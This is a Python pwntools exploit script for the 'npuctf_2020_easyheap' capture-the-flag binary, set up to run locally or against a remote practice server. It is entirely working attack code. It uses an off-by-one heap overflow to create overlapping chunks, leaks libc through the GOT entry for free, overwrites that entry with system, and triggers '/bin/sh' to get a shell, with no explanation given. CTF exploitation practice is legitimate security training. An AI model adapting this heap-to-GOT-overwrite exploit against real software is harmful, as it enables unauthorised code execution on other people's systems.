#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./npuctf_2020_easyheap')
	elf = ELF('./npuctf_2020_easyheap',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

else:
	p = remote('node3.buuoj.cn',27784)
	elf = ELF('./npuctf_2020_easyheap',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def menu(cmd):
    sla("Your choice :",str(cmd))

def add(size,content):
    menu(1)
    sla(") : ",str(size))
    sda("Content:",content)

def edit(idx,content):
    menu(2)
    sla("Index :",str(idx))
    sda("Content: ",content)

def show(idx):
    menu(3)
    sla("Index :",str(idx))

def delete(idx):
    menu(4)
    sla("Index :",str(idx))

free_got = elf.got['free']

###leak libc###
add(0x38,'AAAA')#0
add(0x18,'BBBB')#1
add(0x18,'CCCC')#2
add(0x18,'/bin/sh\x00')#3

payload = 'A' * 0x30 + p64(0) + '\x41'
edit(0,payload)

delete(1)

payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0x8) + p64(free_got)
add(0x38,payload)#1

show(1)
free = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
libc_base = free - libc.symbols['free']

system = libc_base + libc.symbols['system']

###modify GOT###
edit(1,p64(system))

###get shell###
delete(3)
ia()